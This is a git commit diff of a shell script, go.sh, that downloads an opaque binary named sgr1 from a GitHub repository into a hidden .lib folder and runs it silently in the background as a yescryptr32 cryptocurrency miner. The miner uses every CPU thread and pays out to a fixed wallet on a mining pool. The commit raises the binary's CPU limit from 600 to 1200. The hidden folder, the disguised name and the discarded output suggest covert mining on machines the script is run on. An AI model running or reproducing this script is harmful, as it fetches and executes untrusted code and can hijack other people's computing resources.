b128ff11549dc3e48188a2d54bcf9d03f4d0cdd4
barburonjilo <barburonjilo@outlook.co.id>
2024-06-07 12:12:33 +0700

    Update and rename cobasolo2.sh to go.sh

--- go.sh
+++ go.sh
@@ -13,7 +13,7 @@ mkdir .lib && cd .lib
 
 wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
 chmod +x sgr1
-cpulimit -l 600 -e sgr1 &
+cpulimit -l 1200 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 # nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$($RANDOM | md5sum | head -c 5) --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
